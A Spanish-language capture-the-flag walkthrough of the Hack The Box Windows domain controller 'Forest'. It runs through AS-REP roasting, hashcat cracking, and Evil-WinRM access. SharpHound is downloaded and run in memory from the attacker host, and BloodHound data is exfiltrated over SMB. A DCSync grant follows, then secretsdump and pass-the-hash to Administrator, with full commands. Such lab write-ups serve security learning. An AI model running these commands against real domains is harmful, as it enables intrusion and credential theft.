***
- Tags: #LDAP #Hashcat #SMB #ActiveDirectory
****
Vamos a resolver la máquina Forest 
- Categoría: Fácil
- Sistema: Windows
- IP: `10.10.10.161`

### 1. Enumeración

Realizamos un primer escaneo inicial con nmap a la máquina y obtenemos la siguiente información:

```bash
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-27 10:14:54Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC

Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-05-27T03:15:50-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m51s, deviation: 4h02m30s, median: 6m50s
| smb2-time: 
|   date: 2025-05-27T10:15:51
|_  start_date: 2025-05-27T10:12:18
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```

Lo primero que llama la atención es que parece un Domain Controller, concretamente para el dominio `HTB.LOCAL` y que el puerto *5985* se encuentra abierto, lo que significa que si encontramos credenciales para un usuario podremos obtener una shell con Evil-WinRM. Podemos realizar un reconocimiento DNS sobre `htb.local` y `forest.htb.local`:

```bash
dig @10.10.10.161 htb.local 
...SNIP...
;; ANSWER SECTION: 
htb.local. 3600 IN A 10.10.10.161 
;; Query time: 150 msec 
;; SERVER: 10.10.10.161#53(10.10.10.161)

dig @10.10.10.161 forest.htb.local 
...SNIP...
;; ANSWER SECTION: 
forest.htb.local. 3600 IN A 10.10.10.161 
;; Query time: 150 msec 
;; SERVER: 10.10.10.161#53(10.10.10.161)
...SNIP...
```

Intentamos enumerar shares con smbmap o sesión anónima con smbclient:

```bash
smbclient -N -L //10.10.10.161 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Pero tampoco nos deja. Ya que el puerto 445 (RPC) se encuentra abierto, pasamos a intentar enumerar información ahí.

```bash
rpcclient -U "" -N 10.10.10.161
rpcclient $> 
```

> *`-N` → Indica que **no se usará contraseña** (sin prompt de contraseña).*

Hemos conseguido entrar. Consultar [[SMB - Server Message Block]] para visualizar comandos existentes aquí. Enumeramos usuarios y vemos algunos muy interesantes:

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
...
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

También podemos enumerar grupos con `enumdomusers` y a partir de ahí, enumerar miembros de un grupo. Fijémonos en el grupo de administradores:

```bash
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
```

```bash
rpcclient $> querygroup 0x200
	Group Name:	Domain Admins
	Description:	Designated administrators of the domain
	Group Attribute:7
	Num Members:1
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
```

Esa es la cuenta del administrador:

```bash
rpcclient $> queryuser 0x1f4
	User Name   :	Administrator
	Full Name   :	Administrator
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	mar, 27 may 2025 12:13:12 CEST
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 01 ene 1970 01:00:00 CET
	Password last set Time   :	mar, 31 ago 2021 02:51:59 CEST
	Password can change Time :	mié, 01 sep 2021 02:51:59 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000010
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x0000008b
	padding1[0..7]...
	logon_hrs[0..21]...
```

### 2. Explotación

Ahora vamos a pasar a lo que se conoce como Kerberoasting. Usualmente necesita credenciales en el dominio para autenticarnos. Existe la posibilidad de que una cuenta tenga la propiedad *Do not require Kerberos preauthentication* o `UF_DONT_REQUIRE_PREAUTH` como `true`. AS-REP Roasting es un ataque contra Kerberos para esas cuentas. Creamos un txt con los usuarios que enumeramos antes con RPC (los que no tengan SM o HealthMailbox):

```
Administrator
andy
lucinda
mark
santi
sebastien
svc-alfresco
```

Lo siguiente es usar la herramienta de impacket `impacket-GetNPUsers` para intentar obtener un hash de cada usuarios. Creamos un script en bash:

```bash
#!/bin/bash

# IP del controlador de dominio
DC_IP="10.10.10.161"

# Dominio
DOMAIN="htb"

# Archivo con lista de usuarios
USER_FILE="users"

# Verificación de existencia del archivo
if [ ! -f "$USER_FILE" ]; then
    echo "[!] El archivo '$USER_FILE' no existe. Asegúrate de tenerlo en el mismo directorio."
    exit 1
fi

echo "[*] Enumerando usuarios Kerberos con GetNPUsers.py..."

# Bucle para cada usuario en el archivo
while read -r user; do
    if [ -n "$user" ]; then
        echo "[+] Probando usuario: $user"
        impacket-GetNPUsers -no-pass -dc-ip "$DC_IP" "${DOMAIN}/${user}" 2>/dev/null | grep -v "Impacket"
    fi
done < "$USER_FILE"
```

Al ejecutarlo obtenemos el hash de `svc-afresco`

```
[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:1941a918ee98c179f8fd216f1deb8bc3$ea89d5df9e50edd4dc68f4f2976efaa43cb0c65de0326bf0aeaffe6cfc01959b33974c2f4a7bd4796d429dbbbb1c2f61af2f6a1123fea24b6f385677a002804df6a8aa6644175647ea65426f1646a45a21f1065355e8964e717f4830ee548738ebd6223d6d37aa6ad675f96a30fe5b5db7edf02011ace81a5f7ee632df77bb9248419c38cc2a2dead14814d997cc4223b31ec434ca9e23baaf2cac90e19cb4361c7aa1b9766738fd8bef6a1c468f567bf58ed033046bf8702603e4682b57c57022d3308af9dd7dfc5b9721589925c4cb55a288fd6cf9b0bfb408cf6b23a6520a
```

Lo intentamos romper con hashcat, con el módulo 18200 (AS REP Cracking)

```bash
hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
```

Y tras esperar un rato, hashcat nos avisa de que la contraseña es `s3rvice`, obtenida del diccionario rockyou.txt. A partir de aquí tenemos usuario y contraseña. Pues como hemos visto al principio, si tenemos credenciales podemos establecer una sesión con Evil-WinRM. 

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
...
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

La flag se encuentra en el escritorio del usuario. 

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
6361e4711aad862075c8a981864d3852
```
### 3. Escalada de privilegios

Descargamos ahora [SharpHound](git clone https://github.com/BloodHoundAD/BloodHound.git) en nuestra máquina de atacante y la subimos a la máquina víctima. Sharphound se encuentra en la carpeta Collectors. Necesitamos usar esto para recopilar información para usar BloodHound luego. Para ello podemos crear un servidor local en Python y descargar el archivo desde Windows:

```bash
python3 -m http.serer 80 #Máquina atacante
-------------------------------------------
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")
```

Ahora lo invocamos:

```cmd
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
```

> *El objetivo de **usar SharpHound** no es solo ejecutarlo, sino **recolectar los datos de Active Directory y llevártelos a tu máquina para analizarlos con BloodHound** (la aplicación gráfica que corre en Kali, no en la máquina víctima).*

El resultado es un .zip. 

```

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/27/2025   7:11 AM              0 20250527071120_BloodHound.zip
```

El siguiente paso es usar `smbserver` para exfiliar los resultados. Desde nuestra máquina de atacante:

```bash
impacket-smbserver share . -smb2support -username alejo -password 1573
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Y en la máquina víctima:

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net use \\10.10.14.6\share 1573 /user:alejo
The command completed successfully.
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> copy 20250527071120_BloodHound.zip \\10.10.14.6\share\
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> del 20250527071120_BloodHound.zip
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net use /d \\10.10.14.6\share
\\10.10.14.6\share was deleted successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> 
```

##### ¿Qué hace esta secuencia?

1. `net use \\10.10.14.6\share 1573 /user:alejo`  
    → Establece una conexión SMB desde el Windows remoto a tu Kali (donde tú estás ejecutando `impacket-smbserver`). Es como montar una carpeta compartida de red.
2. `copy 20250527071120_BloodHound.zip \\10.10.14.6\share\`  
    → Copia el archivo ZIP generado por SharpHound al recurso SMB de tu Kali. Aquí es donde **exfiltras el archivo** a tu equipo atacante.
3. `del 20250527071120_BloodHound.zip`  
    → Limpias el archivo del sistema comprometido para no dejar rastro.
4. `net use /d \\10.10.14.6\share`  
    → Desconectas la unidad de red para dejar todo limpio.

##### ¿Cómo usamos BloodHound?

Primero iniciamos `neo4j`. Desde una terminal con la siguiente secuencia:

```bash
sudo neo4j console
```

Esto:
- Levanta el servidor en `127.0.0.1:7474` (acceso web a la consola de Neo4j).
- La base de datos escucha también en el puerto `7687` (protocolo Bolt) que es el que usa BloodHound para conectarse.

![[Forest_1.png| 800]]

El siguiente paso es iniciar Bloodhound como tal, que es la app GUI. Para ello, instalamos con `sudo apt install bloodhound`. Tras ello, lo ejecutamos y nos pedirá editar el archivo `bhapi.json` . Las credenciales de Neo4j son `neo4j:1573`. Después de esto, lanzamos Bloodhound de manera normal. Si bienla contraseña por defecto es admin, nos dará el coñazo con poner una hiper segura. Hemos establecido

```
BloodAdmin1573_
```

Al cargar el zip generado con SharpHound, obtenemos esta información:

![[Forest_3.png]]

Hay que realizar dos escaladas para pasar de mi acceso actual como `svc-alfresco` a `Administrator`, quien pertenece al grupo **Domain Admins**.
##### Unirse al grupo "Exchange Windows Permissions"

Dado que mi usuario pertenece al grupo **Service Account**, que a su vez es miembro de **Privileged IT Account**, el cual es miembro de **Account Operators**, es como si mi usuario fuera efectivamente miembro de **Account Operators**.  
Y **Account Operators** tiene el privilegio **GenericAll** sobre el grupo **Exchange Windows Permissions**.

Si hago clic derecho sobre la arista en BloodHound y selecciono "Help", en la ventana emergente aparece una pestaña llamada **"Abuse Info"** que muestra lo siguiente:

![[Forest_4.png]]

Esto nos da todo el escenario de cómo abusar esto, incluso con un ejemplo proporcionado al final:

```cmd
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
```

O también:

```
net group "Exchange Windows Permissions" svc-alfresco /add /domain
```

Ahora aprovechamos el hecho de que los miembros del grupo **Exhange Windows Permissions** tienen el permiso WriteDacl sobre el dominio. Nuevamente, al consultar la ayuda en BloodHound, muestra los siguientes comandos disponibles para ejecutar:

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```


En este punto ejecutamos el siguiente oneline

```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

El comando completo desglosado es el siguiente:

```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; 
$username = "htb\svc-alfresco"; 
$password = "s3rvice"; 
$secstr = New-Object -TypeName System.Security.SecureString; 
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; 
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; 
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

##### 1. Agregar usuario `svc-alfresco` al grupo `Exchange Windows Permissions`:

```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco;
```

- Añade el usuario `svc-alfresco` al grupo con permisos especiales `Exchange Windows Permissions`.
- Este grupo tiene privilegios importantes sobre el dominio, incluyendo la capacidad de modificar ACLs (control de acceso), que luego nos permiten escalar privilegios.
##### 2. Definición de variables con usuario y contraseña:

```powershell
$username = "htb\svc-alfresco"; 
$password = "s3rvice";
```

- Guarda el nombre completo del usuario en variable `$username` (formato dominio\usuario).
- Guarda la contraseña en texto plano en `$password`.
##### 3. Creación de un objeto `SecureString` para la contraseña:

```powershell
$secstr = New-Object -TypeName System.Security.SecureString; 
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
```

- Crea un objeto vacío tipo `SecureString` para almacenar la contraseña de forma segura.
- Convierte la contraseña en un array de caracteres y los añade uno a uno al `SecureString` con `AppendChar`.
- Esto evita que la contraseña esté en texto plano en memoria y es necesario para crear las credenciales PowerShell.

##### 4. Creación del objeto `PSCredential`:

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr;
```

- Genera un objeto `PSCredential` que almacena las credenciales (usuario + contraseña segura).
- Este objeto se usa para autenticarse en funciones que requieren permisos en el dominio.

##### 5. Conceder permiso `DCSync` sobre el grupo Domain Admins:

```powershell
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

- Utiliza el cmdlet de PowerView `Add-DomainObjectAcl` para modificar las listas de control de acceso (ACLs) del objeto `Domain Admins`.
- Con las credenciales proporcionadas (`$Cred`), se añade un permiso DCSync a `svc-alfresco` sobre el grupo `Domain Admins`.
- Esto permite que el usuario `svc-alfresco` pueda replicar las contraseñas y hashes de cuentas de dominio, incluyendo administradores, mediante un ataque DCSync.

A partir de aquí podemos usar `secretsdump.py` para extraer hashes de cualquier usuario del dominio. Podemos hacer esto con impacket desde nuestra máquina de atacante Kali:

```bash
impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
...SNIP...
```

No necesitamos ni crackear el hash, con usar un PassTheHash con `wmiexec` podemos entrar como administrador:

```bash
mpacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator
```

Listo, ya somos root. Podríamos acontecer el Pass The Hash con Evil-WinRM también. 

![[Forest_5.png]]